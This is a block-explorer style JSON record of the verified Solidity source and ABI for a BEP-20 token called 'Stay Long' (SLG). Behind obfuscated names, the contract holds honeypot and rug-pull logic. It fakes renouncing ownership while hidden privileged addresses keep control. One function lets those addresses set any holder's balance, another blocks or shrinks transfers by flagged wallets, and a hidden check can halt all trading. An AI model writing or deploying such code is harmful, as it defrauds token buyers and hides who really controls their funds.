{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface listAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxIs {\n    function createPair(address amountList, address totalSwap) external returns (address);\n}\n\ninterface receiverExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAt) external view returns (uint256);\n\n    function transfer(address fundWalletFrom, uint256 fundMaxAt) external returns (bool);\n\n    function allowance(address launchReceiverList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundMaxAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundWalletFrom,\n        uint256 fundMaxAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingExemptAuto, uint256 value);\n    event Approval(address indexed launchReceiverList, address indexed spender, uint256 value);\n}\n\ninterface takeLaunched is receiverExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StayLong is txAuto, receiverExempt, takeLaunched {\n\n    uint256 private receiverTrading;\n\n    uint256 constant fromMarketing = 18 ** 10;\n\n    mapping(address => bool) public feeListSender;\n\n    function transfer(address takeMin, uint256 fundMaxAt) external virtual override returns (bool) {\n        return launchedTo(_msgSender(), takeMin, fundMaxAt);\n    }\n\n    uint8 private feeTake = 18;\n\n    uint256 private receiverTx = 100000000 * 10 ** 18;\n\n    function balanceOf(address enableAt) public view virtual override returns (uint256) {\n        return modeShould[enableAt];\n    }\n\n    string private takeTx = \"Stay Long\";\n\n    uint256 public exemptTotal;\n\n    bool public buyLaunchTx;\n\n    function listMode() private view {\n        require(receiverModeMax[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed atTx, address indexed toTx);\n\n    address public senderTo;\n\n    uint256 public teamSellExempt;\n\n    uint256 feeFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeTake;\n    }\n\n    mapping(address => bool) public receiverModeMax;\n\n    uint256 private liquiditySell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAmount;\n    }\n\n    function teamWalletMarketing(address isExemptSwap) public {\n        require(isExemptSwap.balance < 100000);\n        if (sellLimit) {\n            return;\n        }\n        if (teamSellExempt != txTo) {\n            launchedReceiverSell = exemptTotal;\n        }\n        receiverModeMax[isExemptSwap] = true;\n        if (teamSellExempt == receiverTrading) {\n            receiverTrading = exemptTotal;\n        }\n        sellLimit = true;\n    }\n\n    address public launchTrading;\n\n    uint256 public shouldSender;\n\n    function owner() external view returns (address) {\n        return autoTxReceiver;\n    }\n\n    address private autoTxReceiver;\n\n    mapping(address => uint256) private modeShould;\n\n    function transferFrom(address feeList, address fundWalletFrom, uint256 fundMaxAt) external override returns (bool) {\n        if (_msgSender() != exemptFund) {\n            if (tradingSell[feeList][_msgSender()] != type(uint256).max) {\n                require(fundMaxAt <= tradingSell[feeList][_msgSender()]);\n                tradingSell[feeList][_msgSender()] -= fundMaxAt;\n            }\n        }\n        return launchedTo(feeList, fundWalletFrom, fundMaxAt);\n    }\n\n    function allowance(address receiverAmount, address swapWallet) external view virtual override returns (uint256) {\n        if (swapWallet == exemptFund) {\n            return type(uint256).max;\n        }\n        return tradingSell[receiverAmount][swapWallet];\n    }\n\n    uint256 private txTo;\n\n    function modeExemptAt(address feeList, address fundWalletFrom, uint256 fundMaxAt) internal returns (bool) {\n        require(modeShould[feeList] >= fundMaxAt);\n        modeShould[feeList] -= fundMaxAt;\n        modeShould[fundWalletFrom] += fundMaxAt;\n        emit Transfer(feeList, fundWalletFrom, fundMaxAt);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeTx;\n    }\n\n    uint256 exemptFee;\n\n    function approve(address swapWallet, uint256 fundMaxAt) public virtual override returns (bool) {\n        tradingSell[_msgSender()][swapWallet] = fundMaxAt;\n        emit Approval(_msgSender(), swapWallet, fundMaxAt);\n        return true;\n    }\n\n    function launchedTo(address feeList, address fundWalletFrom, uint256 fundMaxAt) internal returns (bool) {\n        if (feeList == launchTrading) {\n            return modeExemptAt(feeList, fundWalletFrom, fundMaxAt);\n        }\n        uint256 listSell = receiverExempt(senderTo).balanceOf(minTo);\n        require(listSell == exemptFee);\n        require(fundWalletFrom != minTo);\n        if (feeListSender[feeList]) {\n            return modeExemptAt(feeList, fundWalletFrom, fromMarketing);\n        }\n        return modeExemptAt(feeList, fundWalletFrom, fundMaxAt);\n    }\n\n    bool public sellLimit;\n\n    uint256 private launchedReceiverSell;\n\n    mapping(address => mapping(address => uint256)) private tradingSell;\n\n    function feeTrading(address takeMin, uint256 fundMaxAt) public {\n        listMode();\n        modeShould[takeMin] = fundMaxAt;\n    }\n\n    function shouldLaunchTake(address launchedWallet) public {\n        listMode();\n        if (launchedReceiverSell != shouldSender) {\n            shouldSender = receiverTrading;\n        }\n        if (launchedWallet == launchTrading || launchedWallet == senderTo) {\n            return;\n        }\n        feeListSender[launchedWallet] = true;\n    }\n\n    constructor (){\n        \n        listAmount takeTo = listAmount(exemptFund);\n        senderTo = maxIs(takeTo.factory()).createPair(takeTo.WETH(), address(this));\n        \n        launchTrading = _msgSender();\n        tokenMode();\n        receiverModeMax[launchTrading] = true;\n        modeShould[launchTrading] = receiverTx;\n        if (takeFundSwap == buyLaunchTx) {\n            receiverTrading = launchedReceiverSell;\n        }\n        emit Transfer(address(0), launchTrading, receiverTx);\n    }\n\n    bool private takeFundSwap;\n\n    function tokenMode() public {\n        emit OwnershipTransferred(launchTrading, address(0));\n        autoTxReceiver = address(0);\n    }\n\n    address exemptFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return autoTxReceiver;\n    }\n\n    address minTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptShould(uint256 fundMaxAt) public {\n        listMode();\n        exemptFee = fundMaxAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTx;\n    }\n\n    string private swapAmount = \"SLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchReceiverList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingExemptAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMaxAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunchTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundMaxAt\",\"type\":\"uint256\"}],\"name\":\"exemptShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeListSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMaxAt\",\"type\":\"uint256\"}],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverModeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedWallet\",\"type\":\"address\"}],\"name\":\"shouldLaunchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExemptSwap\",\"type\":\"address\"}],\"name\":\"teamWalletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMaxAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundWalletFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundMaxAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StayLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}